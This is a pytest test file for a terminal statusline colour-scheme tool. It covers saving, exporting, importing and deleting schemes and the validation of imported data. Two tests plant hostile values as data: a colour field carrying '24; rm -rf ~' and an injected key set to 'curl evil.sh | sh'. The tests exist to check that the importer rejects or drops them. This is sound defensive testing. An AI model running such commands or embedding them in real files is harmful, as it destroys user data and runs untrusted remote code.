import json

import pytest

from claude_style.config import CUSTOM_PRESET, set_color
from claude_style.presets import PRESETS
from claude_style.schemes import (
    SchemeError,
    all_scheme_names,
    delete_scheme,
    export_config,
    export_scheme,
    import_scheme,
    is_name_taken,
    save_scheme,
    scheme_config,
    user_scheme_names,
)
from claude_style.validate import ConfigError


def test_saved_scheme_loads_back_with_the_same_colors(schemes_dir, config):
    set_color(config, "dir", "bg", 61)
    save_scheme("mine", config)

    loaded = scheme_config("mine")

    assert loaded["segments"]["dir"]["bg"] == 61
    assert loaded["preset"] == "mine"


def test_user_schemes_are_listed_after_builtins(schemes_dir, config):
    save_scheme("zeta", config)
    save_scheme("alpha", config)

    assert all_scheme_names() == list(PRESETS) + ["alpha", "zeta"]


def test_export_then_import_under_new_name_round_trips(schemes_dir, config):
    set_color(config, "git", "bg_dirty", 202)
    text = export_config(config, "shared")

    saved_as = import_scheme(text, name="from-friend")

    assert saved_as == "from-friend"
    assert scheme_config("from-friend")["segments"]["git"]["bg_dirty"] == 202


def test_exporting_a_builtin_preset_produces_an_importable_file(schemes_dir):
    text = export_scheme("nord")

    assert import_scheme(text, name="my-nord") == "my-nord"


def test_import_rejects_json_that_is_not_a_scheme(schemes_dir):
    with pytest.raises(SchemeError, match="not a Claude Code Statusline Designer scheme"):
        import_scheme(json.dumps({"segments": {}}))


def test_import_rejects_invalid_json(schemes_dir):
    with pytest.raises(SchemeError, match="not valid JSON"):
        import_scheme("{nope")


def test_import_rejects_unsupported_version(schemes_dir, config):
    doc = json.loads(export_config(config, "x"))
    doc["version"] = 99

    with pytest.raises(SchemeError, match="unsupported scheme version"):
        import_scheme(json.dumps(doc))


def test_malicious_scheme_is_rejected_and_nothing_is_written(schemes_dir, config):
    doc = json.loads(export_config(config, "evil"))
    doc["config"]["segments"]["dir"]["bg"] = "24; rm -rf ~"

    with pytest.raises(ConfigError, match="segments.dir.bg"):
        import_scheme(json.dumps(doc))

    assert user_scheme_names() == []


def test_import_drops_keys_the_config_does_not_know(schemes_dir, config):
    doc = json.loads(export_config(config, "extra"))
    doc["config"]["segments"]["dir"]["on_render"] = "curl evil.sh | sh"
    doc["config"]["hooks"] = ["x"]

    import_scheme(json.dumps(doc))
    loaded = scheme_config("extra")

    assert "on_render" not in loaded["segments"]["dir"]
    assert "hooks" not in loaded


def test_import_refuses_to_silently_overwrite_an_existing_scheme(schemes_dir, config):
    save_scheme("taken", config)

    with pytest.raises(SchemeError, match="already exists"):
        import_scheme(export_config(config, "taken"))


@pytest.mark.parametrize("name", ["agnoster", CUSTOM_PRESET])
def test_builtin_and_reserved_names_cannot_be_saved(schemes_dir, config, name):
    with pytest.raises(SchemeError):
        save_scheme(name, config)
    assert is_name_taken(name)


def test_saving_twice_needs_overwrite(schemes_dir, config):
    save_scheme("again", config)
    with pytest.raises(SchemeError, match="already exists"):
        save_scheme("again", config)

    save_scheme("again", config, overwrite=True)


def test_builtin_presets_cannot_be_deleted(schemes_dir):
    with pytest.raises(SchemeError, match="built-in"):
        delete_scheme("dracula")


def test_deleted_scheme_is_gone(schemes_dir, config):
    save_scheme("temp", config)
    delete_scheme("temp")

    assert "temp" not in all_scheme_names()
    with pytest.raises(SchemeError, match="unknown scheme"):
        scheme_config("temp")


@pytest.mark.parametrize("name", ["../escape", "a/b", "", "x" * 41, ".hidden"])
def test_path_like_or_invalid_names_are_rejected(schemes_dir, config, name):
    with pytest.raises(ConfigError, match="invalid name"):
        save_scheme(name, config)
